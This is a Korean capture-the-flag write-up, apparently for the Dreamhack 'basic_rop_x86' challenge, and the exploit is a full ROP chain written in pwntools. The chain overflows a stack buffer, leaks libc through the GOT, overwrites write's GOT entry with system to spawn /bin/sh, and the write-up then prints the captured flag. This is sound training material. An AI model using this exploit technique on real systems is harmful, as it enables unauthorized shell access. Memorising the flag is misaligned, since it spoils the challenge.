<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "basic_rop_x86"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.29 풀이

<img width="1280" height="320" alt="image" src="https://github.com/user-attachments/assets/ca90b00a-4a6c-4a0e-997d-f88d4ded0fc5" />

제공받은 elf를 checksec로 확인해보았다. 보니, NX가 적용된 것을 알 수 있다.

<br>

</br> 

<img width="492" height="844" alt="image" src="https://github.com/user-attachments/assets/12388dd9-9b38-42af-a9b2-9855a861f3dd" />

이전 작성한 basic_rop_x64 문제와 같은 코드인 것으로 보인다.
  
<br>

</br> 

<img width="580" height="856" alt="image" src="https://github.com/user-attachments/assets/89368efe-cba6-404f-bf14-c682c93111fe" />

main 함수를 어셈블리 해보니, buf에 0x44를 할당하는 것을 알 수 있다.

buf의 크기가 0x40이니까, 나머지 0x4는 더미 값인 것을 보인다. 전 문제를 비슷한 방식으로 접근하면 될 것으로 보인다. 
  
<br>

</br> 

<img width="570" height="314" alt="image" src="https://github.com/user-attachments/assets/79e3cfc6-38f7-4042-a023-a9b8ef400e4f" />

익스플로잇 코드 작성할 때 필요한 가젯 주소를 구하였다.
  
<br>

</br> 

```
from pwn import *

context(arch='i386', os='linux')

p = remote('host8.dreamhack.games', 19076)
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "libc.so.6")}
e = ELF('./basic_rop_x86')
libc = ELF('./libc.so.6', checksec=False)

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

bss = e.bss()

pppr = 0x8048689

payload = b'A' * 0x48   # buf + SFP

payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)

payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)

payload += p32(write_plt)
payload += b'A' * 0x4
payload += p32(bss)

p.send(payload)

p.recvuntil(b'A' * 0x40)
read_addr = u32(p.recvn(4))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')
log.info(f'libc base : {hex(libc_base)}')

system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p32(system))
p.sendline(b"/bin/sh")

p.interactive()
```

위와 같이 코드를 작성해보았다. read 실제 주소를 알아내

libc 베이스와 system 주소를 계산한 후,

이 system 주소를 덮어쓴 후 /bin/sh\x00 덧붙여 /bin/sh를 실행하는 코드이다.
  
<br>

</br> 

<img width="1080" height="596" alt="image" src="https://github.com/user-attachments/assets/99e2c78e-3646-471e-a8b4-8f98cd2fa3f1" />

해당 코드를 실행해보니 플래그 값을 얻을 수 있었다.  

<br>

</br> 

```
DH{511346c4606e748addd555cc9947aacf67990d504fac432f5dbb0f14eea8363b}
```

